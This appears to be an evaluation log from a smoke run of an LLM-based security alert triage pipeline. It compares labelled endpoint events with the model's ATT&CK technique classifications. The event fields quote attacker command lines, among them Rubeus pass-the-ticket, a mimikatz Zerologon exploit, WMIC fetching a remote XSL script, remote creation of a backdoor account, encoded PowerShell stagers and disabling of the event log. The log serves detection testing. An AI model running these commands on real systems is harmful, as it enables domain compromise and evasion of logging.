# triage-v1 smoke run (openrouter:nvidia/nemotron-3-super-120b-a12b:free -> openrouter:nvidia/nemotron-3-ultra-550b-a55b:free)

Read every row. Look for failure shapes, not a score.

## day2-006  label=true_positive ['T1685.001']  got=true_positive ['T1562.001'] conf=0.85
- event: `C:\Users\IT01-Pedro\Downloads\payload.exe`
- label why: Process named payload.exe (from Downloads) sets the EventLog service Start value to Disabled.
- model why: A process located in the user's Downloads folder modified the EventLog service start type to disabled (DWORD 0x00000004) under HKLM, which is consistent with adversaries disabling Windows Event Logging to impair defenses.
- iocs: ['C:/Users/IT01-Pedro/Downloads/payload.exe', 'HKLM/System/CurrentControlSet/Services/EventLog/Start', 'DWORD (0x00000004)']  evidence: ['events[0].process.image', 'events[0].registry.target_object', 'events[0].registry.details']  retries: 0
- retrieved: ['T1547.002', 'T1547.001', 'T1543.003', 'T1547.010', 'T1218.011']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/05ca34de0d8e2b8f9ec5ee67b127f92c

## day2-014  label=true_positive ['T1059.005']  got=true_positive ['T1059.005'] conf=0.9
- event: `"C:\windows\System32\WScript.exe" "C:\Users\pgustavo\Desktop\launcher.vbs" `
- label why: wscript.exe executing a script named launcher.vbs from the user's Desktop.
- model why: The event shows wscript.exe (a legitimate Windows script host) executing a VBScript file located in the user's Desktop directory, which is a suspicious location for script execution consistent with adversary use of Visual Basic for execution. This matches the behavior of technique T1059.005 (Visual Basic).
- iocs: ['C:/Users/pgustavo/Desktop/launcher.vbs']  evidence: ['events[0].process.command_line', 'events[0].process.image']  retries: 0
- retrieved: ['T1547.001', 'T1218.011', 'T1037.001', 'T1059.005', 'T1218.014']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/760cd8d94df009b38630fe2d6b791b1d

## day2-016  label=benign_noisy []  got=benign_noisy [] conf=0.8
- event: `C:\windows\system32\svchost.exe`
- label why: svchost writing to the Windows Notification platform's internal data cache; OS housekeeping.
- model why: The event shows a registry modification under Notifications/Data by the legitimate system process svchost.exe, with no suspicious file paths, command lines, or payload indicators. This is consistent with normal Windows notification configuration activity.
- iocs: ['HKLMSOFTWAREMicrosoftWindows NTCurrentVersionNotificationsData418A073AA3BC3475', 'C:windowssystem32svchost.exe']  evidence: ['events[0].registry.target_object', 'events[0].process.image', 'events[0].registry.details']  retries: 0
- retrieved: ['T1218.002', 'T1218.008', 'T1546.009', 'T1027.012', 'T1555.004']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/16bcdb5eba900743a208c22494b6127e

## day2-017  label=benign_noisy []  got=benign_noisy [] conf=0.85
- event: `C:\windows\System32\svchost.exe`
- label why: svchost writing a generic provider StartTime timestamp; routine OS housekeeping.
- model why: The event shows svchost.exe writing a timestamp QWORD value to HKLM...VFUProvider.StartTime, a non-standard registry location not associated with known persistence mechanisms like Run keys or Time Providers. This appears to be a legitimate Windows component updating its internal state, not adversarial behavior.
- iocs: ['HKLM SOFTWARE Microsoft Windows CurrentVersion VFUProvider StartTime', 'QWORD (0x01d6a5a9-0x64046265)']  evidence: ['events[0].registry.target_object', 'events[0].process.image', 'events[0].registry.details']  retries: 0
- retrieved: ['T1547.001', 'T1547.003', 'T1574.011', 'T1218.011', 'T1546.009']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/175fcb6c483708e408557ea250be6c45

## day2-026  label=benign_noisy []  got=benign_noisy [] conf=0.82
- event: `C:\Windows\system32\svchost.exe`
- label why: svchost writing an identity/account-linking cache value; routine OS housekeeping.
- model why: The event shows svchost.exe running as SYSTEM writing a value to HKU<...>-1002>SoftwareMicrosoftIdentityCRL ExtendedProperties LID, which is a normal operation of the Windows Identity CRL service accessing user-specific credential roaming storage. No indicators of malicious technique are present.
- iocs: []  evidence: ['events[0].process.image', 'events[0].user', 'events[0].registry.target_object']  retries: 0
- retrieved: ['T1555.004', 'T1546.009', 'T1547.005', 'T1574.011', 'T1003.001']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/de6e544e2d5a603697f6ce84233eb255

## day2-040  label=benign_noisy []  got=benign_noisy [] conf=0.9
- event: `C:\windows\system32\wbem\wmiprvse.exe -Embedding`
- label why: WmiPrvSE -Embedding is the standard WMI provider host self-launch.
- model why: The event shows WmiPrvSE.exe (Windows Management Instrumentation Provider) launched with the -Embedding switch by svchost.exe under the SYSTEM account, which is a standard Windows mechanism for COM activation and not indicative of abuse. No additional malicious behavior is observed.
- iocs: []  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.image', 'events[0].user']  retries: 0
- retrieved: ['T1547.001', 'T1218.014', 'T1555.004', 'T1546.008', 'T1055.011']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/c7e5dee59f75dcc55e0b013323c187cb

## day3-044  label=benign_noisy []  got=benign_noisy [] conf=0.9
- event: `C:\Program Files (x86)\Microsoft Office\root\Office16\SDXHelper.exe`
- label why: Microsoft Office SDX helper connecting to Microsoft cloud on 443, telemetry and content refresh.
- model why: The event shows a legitimate Microsoft Office binary (SDXHelper.exe) making an outbound HTTPS connection to an external IP on port 443, which is typical for Office telemetry or update traffic and lacks any signs of exploitation, unusual command-line arguments, or malicious behavior.
- iocs: ['C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\SDXHelper.exe', '52.113.194.132']  evidence: ['events[0].process.image', 'events[0].network.dst_ip', 'events[0].network.dst_port', 'events[0].network.protocol']  retries: 0
- retrieved: ['T1203', 'T1016.001', 'T1137.002', 'T1049', 'T1218.003']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/63fac2bb91057003b0964fbc22fc5d6f

## day3-056  label=true_positive ['T1127.001']  got=true_positive ['T1127.001'] conf=0.9
- event: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe  C:\Windows\Tasks\pshell.xml`
- label why: MSBuild.exe builds C:/Windows/Tasks/pshell.xml, a project with an inline task, to run code through a trusted developer tool.
- model why: The event shows MSBuild.exe loading a project file from the writable Tasks folder (C:/Windows/Tasks/pshell.xml), which is consistent with abuse of MSBuild to execute arbitrary code via inline tasks. The parent cmd.exe indicates the execution was initiated via a command line, further supporting malicious use.
- iocs: ['C:/Windows/Microsoft.NET/Framework64/v4.0.30319/MSBuild.exe', 'C:/Windows/Tasks/pshell.xml', 'cmd.exe /c C:/Windows/Microsoft.NET/Framework64/v4.0.30319/MSBuild.exe C:/Windows/Tasks/pshell.xml']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.command_line']  retries: 0
- retrieved: ['T1127.001', 'T1218.014', 'T1218.004', 'T1059.003', 'T1059.001']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/8f4310b8a226101e8e102fe083600e13

## day3-070  label=true_positive ['T1059.003']  got=true_positive ['T1202'] conf=0.88
- event: `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`
- label why: cmd.exe /c MoveExcel4.exe spawned by GruntHTTP.exe, a Covenant C2 implant.
- model why: The parent process GruntHTTP.exe (located in the user's Desktop) spawned cmd.exe with a /c argument to execute MoveExcel4.exe and pass an external IP address, indicative of adversaries using indirect command execution to run a payload.
- iocs: ['C:/Users/pgustavo/Desktop/GruntHTTP.exe', 'C:/Users/pgustavo/Desktop/MoveExcel4.exe', '172.18.39.6']  evidence: ['events[0].process.parent.image', 'events[0].process.command_line', 'events[0].process.image']  retries: 0
- retrieved: ['T1218.003', 'T1070.010', 'T1218.014', 'T1202', 'T1204.004']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/e271a3646eacd7c9e42dd61f2eac1725

## day3-071  label=true_positive ['T1021.003']  got=needs_review ['T1570'] conf=0.65
- event: `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
- label why: MoveExcel4.exe <IP> uses DCOM to run an Excel 4.0 macro on a remote host.
- model why: A custom executable named MoveExcel4.exe runs from a user's Desktop with a private IP address (172.18.39.6) as a command-line argument, launched via cmd.exe. The binary name and location are non-standard, and the IP argument suggests network-facing behavior, which aligns with lateral tool transfer (T1570). However, no malicious payload, credential access, or confirmed file transfer is observed; the tool could be a legitimate internal utility for moving Excel files to a network share.
- iocs: ['C:/Users/pgustavo/Desktop/MoveExcel4.exe', '172.18.39.6']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.image']  retries: 0
- retrieved: ['T1070.010', 'T1218.014', 'T1570', 'T1218.003', 'T1080']
- tier: 2 (escalation: confidence 0.65 < 0.7)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/887edd60743cc41c4f951719dfee3011

## day3-072  label=benign_noisy []  got=benign_noisy [] conf=0.95
- event: `"netsh" interface tcp show global`
- label why: netsh interface tcp show global run by the Exchange Health Manager worker, a signed installed Exchange component doing a routine health probe.
- model why: The netsh.exe process was invoked with the benign diagnostic command 'interface tcp show global', which merely displays TCP global settings. It was spawned by the Exchange Health Manager worker (MSExchangeHMWorker.exe) running as SYSTEM, consistent with legitimate health‑check activity. No malicious netsh subcommands (e.g., adding firewall rules, portproxy, or helper DLL registration) are present.
- iocs: []  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.image']  retries: 1
- retrieved: ['T1505.002', 'T1546.007', 'T1197', 'T1070.007', 'T1559.002']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/de868ee85cfdaaa6205ce1f30ed53d14

## day3-089  label=benign_noisy []  got=benign_noisy [] conf=0.95
- event: `C:\windows\system32\sppsvc.exe`
- label why: Software Protection Platform service started by services.exe for licensing checks, signed, System32.
- model why: The event shows the legitimate Windows Software Protection Service (sppsvc.exe) launched by services.exe under the NETWORK SERVICE account, with a normal command line and system path. No indicators of malicious service tampering or abnormal execution are present.
- iocs: []  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.image', 'events[0].user']  retries: 1
- retrieved: ['T1543.003', 'T1569.002', 'T1547.001', 'T1547.010', 'T1574.011']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/3de82773edc140c8f9ed3f16d004aa51

## day3-093  label=true_positive ['T1685.001']  got=true_positive ['T1685.001'] conf=0.95
- event: `REG  ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog /t REG_DWORD /v Start /d 4`
- label why: reg add sets the EventLog service Start value to 4 (disabled), so events stop being recorded after the next boot.
- model why: The reg.exe command adds a DWORD Start value of 4 to the EventLog service registry key, which disables the Windows Event Log service, matching the behavior of T1685.001 (Disable or Modify Windows Event Log).
- iocs: ['HKEY_LOCAL_MACHINE_SYSTEM_CurrentControlSet_Services_EventLog', 'Start', '4']  evidence: ['events[0].process.command_line', 'events[0].process.image']  retries: 0
- retrieved: ['T1547.001', 'T1685.001', 'T1547.010', 'T1574.011', 'T1218.010']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/3ae3b3e2480079e0b8d80c0189c7cc63

## day3-112  label=true_positive ['T1059.001']  got=true_positive ['T1059.001', 'T1027'] conf=0.95
- event: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgB`
- label why: PowerShell -noP -sta -w 1 -enc (encoded stager) spawned by wscript.exe running launcher.vbs.
- model why: The alert shows wscript.exe launching a VBS script from the user's Desktop, which then executes powershell.exe with a Base64-encoded command (-enc). This indicates obfuscated PowerShell execution, consistent with adversarial use of PowerShell for code execution and obfuscation to evade detection.
- iocs: ['C:/Users/pgustavo/Desktop/launcher.vbs']  evidence: ['events[0].process.command_line', 'events[0].process.image', 'events[0].process.parent.command_line']  retries: 0
- retrieved: ['T1059.001', 'T1216.002', 'T1546.013', 'T1546.007', 'T1218.014']
- tier: 1 (escalation: None)  lookups: []
- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/73610fb8303abd6e4c85729a55ae8689

## day3-123  label=true_positive ['T1220']  got=None  conf=None
- event: `wmic  process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"`
- label why: wmic process list /FORMAT:<remote .xsl URL> downloads and executes JScript from a remote stylesheet.
- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
- iocs: None  evidence: None  retries: None
- retrieved: None
- tier: None (escalation: None)  lookups: None
- trace: None

## day3-145  label=true_positive ['T1550.003']  got=None  conf=None
- event: `"C:\users\sbeavers\Desktop\Rubeus.exe" asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt`
- label why: Rubeus asktgt with an RC4 hash and /ptt requests a Kerberos ticket and injects it into the session (pass-the-ticket).
- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
- iocs: None  evidence: None  retries: None
- retrieved: None
- tier: None (escalation: None)  lookups: None
- trace: None

## day3-151  label=true_positive ['T1210']  got=None  conf=None
- event: `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe  "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
- label why: mimikatz lsadump::zerologon /target exploits CVE-2020-1472 (Zerologon) against a domain controller.
- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
- iocs: None  evidence: None  retries: None
- retrieved: None
- tier: None (escalation: None)  lookups: None
- trace: None

## day3-158  label=true_positive ['T1047']  got=None  conf=None
- event: `"C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add backdoor paw0rd1"`
- label why: wmic /node:WORKSTATION6 process call create runs a command on a remote host over WMI.
- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
- iocs: None  evidence: None  retries: None
- retrieved: None
- tier: None (escalation: None)  lookups: None
- trace: None

## day3-166  label=true_positive ['T1021.003']  got=None  conf=None
- event: `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
- label why: MoveExcel4.exe <IP> attempts DCOM lateral movement by remote Excel 4.0 macro execution.
- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
- iocs: None  evidence: None  retries: None
- retrieved: None
- tier: None (escalation: None)  lookups: None
- trace: None

## day3-176  label=true_positive ['T1569.002']  got=None  conf=None
- event: `C:\windows\system32\cmd.exe /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAc`
- label why: cmd.exe started by services.exe running 'start /b powershell -enc' is a remote service executing an encoded stager (PsExec-style).
- model why: transport: TooManyRequestsResponseError: Rate limit exceeded: free-models-per-day. Add 10 credits to unlock 1000 free model requests per day
- iocs: None  evidence: None  retries: None
- retrieved: None
- tier: None (escalation: None)  lookups: None
- trace: None
